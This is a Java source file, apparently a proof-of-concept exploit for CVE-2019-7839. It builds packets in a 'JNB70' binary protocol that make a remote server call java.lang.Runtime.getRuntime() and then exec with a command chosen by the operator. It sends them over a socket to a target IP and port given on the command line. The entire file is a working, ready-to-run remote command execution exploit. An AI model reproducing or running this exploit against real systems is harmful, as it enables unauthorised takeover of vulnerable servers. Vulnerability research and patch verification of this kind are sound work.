package securifera;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;

/**
 *
 * @author b0yd
 */
public class POC {

   
    public static String formatHexDump(byte[] array, int offset, int length) {
        final int width = 16;

        StringBuilder builder = new StringBuilder();

        for (int rowOffset = offset; rowOffset < offset + length; rowOffset += width) {
            builder.append(String.format("%06d:  ", rowOffset));

            for (int index = 0; index < width; index++) {
                if (rowOffset + index < array.length) {
                    builder.append(String.format("%02x ", array[rowOffset + index]));
                } else {
                    builder.append("   ");
                }
            }

            if (rowOffset < array.length) {
                int asciiWidth = Math.min(width, array.length - rowOffset);
                builder.append("  |  ");
                try {
                    builder.append(new String(array, rowOffset, asciiWidth, "UTF-8").replaceAll("\r\n", " ").replaceAll("\n", " "));
                } catch (UnsupportedEncodingException ignored) {
                    //If UTF-8 isn't available as an encoding then what can we do?!
                }
            }

            builder.append(String.format("%n"));
        }

        return builder.toString();
    }

    
    public static byte[] stringToWide( String inputStr ){
        
        byte[] newArray = new byte[inputStr.length() * 2];
        for( int i = 0; i < newArray.length; i = i+2 ){
            newArray[i] = 0x0;
            newArray[i+1] = (byte)inputStr.charAt(i/2);
        }    
        return newArray;
    }
    
    public static ByteBuffer createGetRuntimePayload() throws UnsupportedEncodingException{
        
        //First packet
        ByteBuffer innerBB = ByteBuffer.allocate(20000);
        innerBB.order(ByteOrder.LITTLE_ENDIAN);
        innerBB.put((byte) 0xff);
        innerBB.put((byte) 0xff);
        innerBB.put((byte) 0);
        innerBB.put((byte) 11); //Object Static Call
        
        byte[] runtimeBytes = stringToWide("java.lang.Runtime");
        innerBB.put((byte) 10); //String
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeBytes.length/2);
        innerBB.put(runtimeBytes);
        
        byte[] runtimeMethBytes = stringToWide("getRuntime");
        innerBB.put((byte) 10); //String
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
        
        //Signature
        innerBB.put((byte) 11);//Array Type
        innerBB.put((byte)1);  //
        innerBB.putInt(0);     //Array Size
        innerBB.put((byte)12); //Type Object
        
        runtimeMethBytes = stringToWide("Ljava.lang.String;"); //Signature?
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
                        
        //Args
        innerBB.put((byte) 11);//Array
        innerBB.put((byte)1);  //
        innerBB.putInt(0);     //Array Size
        innerBB.put((byte)12); //Type
        
        runtimeMethBytes = stringToWide("Ljava.lang.String;");
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
               
        innerBB.put((byte)0); //Null 
        innerBB.put((byte)0); //Null 
        innerBB.put((byte)0); //Null 
        
        innerBB.put((byte)0); //Threaded or not
        innerBB.put((byte)0);
        
        ByteBuffer outerBB = ByteBuffer.allocate(20000);
        outerBB.order(ByteOrder.LITTLE_ENDIAN);
        outerBB.put("JNB70".getBytes());
        outerBB.putInt(innerBB.position());
        outerBB.put(Arrays.copyOf(innerBB.array(), innerBB.position()));
        
        return outerBB;

    }
    
    public static ByteBuffer createExecRuntimePayload(long objId, String cmdStr) throws UnsupportedEncodingException{
        
        //First packet
        ByteBuffer innerBB = ByteBuffer.allocate(20000);
        innerBB.order(ByteOrder.LITTLE_ENDIAN);
        innerBB.put((byte) 0xff);
        innerBB.put((byte) 0xff);
        innerBB.put((byte) 0);
        innerBB.put((byte) 21); //Object Static Call
        
        innerBB.put((byte) 3); //Long - Object ID
        innerBB.putLong(objId);
        
        byte[] runtimeMethBytes = stringToWide("exec");
        innerBB.put((byte) 10); //String
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
        
        //Signature
        innerBB.put((byte) 11);//Array Type
        innerBB.put((byte)1);  //
        innerBB.putInt(1);     //Array Size
        innerBB.put((byte)12); //Type Object
        
        runtimeMethBytes = stringToWide("Ljava.lang.String;"); //Signature?
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
        innerBB.put((byte)10);
        runtimeMethBytes = stringToWide("Ljava.lang.String;");
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
                        
        //Args
        innerBB.put((byte) 11);//Array
        innerBB.put((byte)1);  //
        innerBB.putInt(1);     //Array Size
        innerBB.put((byte)12); //Type
        
        runtimeMethBytes = stringToWide("Ljava.lang.String;");
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
        innerBB.put((byte)10);
        runtimeMethBytes = stringToWide(cmdStr);
        innerBB.put((byte)0); //Pre-String
        innerBB.putInt(runtimeMethBytes.length/2);
        innerBB.put(runtimeMethBytes);
               
        innerBB.put((byte)0); //Null 
        innerBB.put((byte)0); //Null 
        innerBB.put((byte)0); //Null 
        
        innerBB.put((byte)0); //Threaded or not
        innerBB.put((byte)0);
        
        ByteBuffer outerBB = ByteBuffer.allocate(20000);
        outerBB.order(ByteOrder.LITTLE_ENDIAN);
        outerBB.put("JNB70".getBytes());
        outerBB.putInt(innerBB.position());
        outerBB.put(Arrays.copyOf(innerBB.array(), innerBB.position()));
        
        return outerBB;

    }
    
    public static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
           sb.append(String.format("%02x", b));
        return sb.toString();
     }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws Exception {

        if(args.length < 2){
            System.out.println("Usage: java -jar CVE-2019-7839.jar <IP Address> <Port> <Command>");
            System.exit(1);
        }
        
        String ipStr = args[0];
        String portStr = args[1];
        String cmdStr = args[2];
        
        ByteBuffer aBB = createGetRuntimePayload();
        
        //Creat an inputstream
        byte[] pkt = Arrays.copyOf(aBB.array(), aBB.position()); 
        
        try (Socket socket = new Socket(ipStr, Integer.parseInt(portStr))) {
            OutputStream output = socket.getOutputStream();
            output.write(pkt);        
        
            InputStream input = socket.getInputStream();
            byte[] data = new byte[4000];
            int bytesRead = input.read(data);
            
            System.out.println(formatHexDump(data,0,bytesRead));
            
            byte[] objIdArr = Arrays.copyOfRange(data, 14, 22);
            
            aBB = ByteBuffer.wrap(objIdArr);
            aBB.order(ByteOrder.LITTLE_ENDIAN);
            long objId = aBB.getLong();
            
            // Create exec
            aBB = createExecRuntimePayload(objId, cmdStr);

            //Creat an inputstream
            pkt = Arrays.copyOf(aBB.array(), aBB.position());
            output.write(pkt);     
            
            data = new byte[4000];
            bytesRead = input.read(data);
            
            System.out.println(formatHexDump(data,0,bytesRead));
        }        

    }
    
}

